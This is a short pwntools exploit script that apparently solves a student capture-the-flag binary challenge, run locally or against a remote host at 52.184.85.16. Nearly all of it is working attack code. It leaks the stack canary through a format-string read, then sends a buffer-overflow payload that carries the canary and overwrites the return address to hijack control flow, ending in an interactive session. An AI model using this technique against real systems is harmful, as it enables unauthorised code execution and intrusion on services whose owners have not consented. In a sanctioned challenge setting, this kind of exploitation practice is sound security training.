from pwn import * 

def conn(): 
    if args.GDB: 
        return gdb.debug(args.BINARY, 
        gdbscript="""
        continue
        """)  # Add necessary gdb commands here
    elif args.REMOTE: 
        return remote('52.184.85.16', 12345)
    else: 
        return process(args.BINARY)

def solve():
    p = conn()
    context.arch = 'amd64'

    context.log_level = 'debug'
    p.sendlineafter(b"NIM:", b"13523111")
    p.sendlineafter(b"Challenge:", b"5")
    p.sendline(b"%27$p")
    # p.interactive()  # Allow manual interaction here

    # After manual interaction, press Ctrl+C to break out of interactive mode
    # p.clean() 
    leak = p.recvline()[:-1]
    print(leak)
    canary = int(leak, 16)
    payload = b"A" * 168
    payload += p64(canary) + b"B" * 8
    payload += p64(0x40144c)
    with open("payload.bin", "wb") as f:
        f.write(b"%11$p\n")
        f.write(payload)
    # write your payload here
    p.sendline(payload) # meng-inject payload ke dalam binary
    p.interactive() # flush to stdout 

solve()
